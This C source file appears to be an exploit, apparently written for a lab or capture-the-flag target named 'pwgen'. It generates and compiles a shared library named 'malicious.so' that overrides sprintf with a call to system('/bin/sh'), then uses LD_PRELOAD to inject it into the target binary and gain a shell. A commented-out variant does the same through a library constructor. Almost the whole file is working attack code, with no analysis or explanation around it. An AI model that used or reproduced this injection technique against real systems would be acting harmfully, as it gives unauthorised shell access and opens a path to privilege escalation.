#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
    // const char *library_code = 
    //     "#include <stdio.h>\n"
    //     "#include <stdlib.h>\n"
    //     "#include <unistd.h>\n"
    //     "#include <string.h>\n"
    //     "void my_init() __attribute__((constructor));\n"
    //     "void my_init() {\n"
    //     "    system(\"/bin/sh\");\n"
    //     "}\n";

    const char *library_code = 
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "#include <dlfcn.h>\n"
        "#include <stdarg.h>\n"
        "int sprintf(char *str, const char *format, ...) {\n"
        "    system(\"/bin/sh\");\n"
        "    return 1;\n"
        "}\n";

    // Write the malicious code to a .c file
    FILE *file = fopen("malicious.c", "w");
    if (!file) {
        perror("fopen");
        return 1;
    }
    fprintf(file, "%s", library_code);
    fclose(file);

    // Compile the .c file into a shared library
    if (system("gcc -shared -fPIC -o malicious.so malicious.c") != 0) {
        fprintf(stderr, "Compilation failed\n");
        return 1;
    }

    // Construct the LD_PRELOAD environment variable
    char *ld_preload = realpath("malicious.so", NULL);
    if (!ld_preload) {
        perror("realpath");
        return 1;
    }
    printf("Using LD_PRELOAD=%s\n", ld_preload);

    // Set the LD_PRELOAD environment variable
    if (setenv("LD_PRELOAD", ld_preload, 1) != 0) {
        perror("setenv");
        return 1;
    }

    // Execute the target binary
    const char *target = "./pwgen";  // Replace with the actual binary you want to target
    execl(target, target, "-e=12345", NULL);

    // Clean up
    free(ld_preload);

    return 0;
}
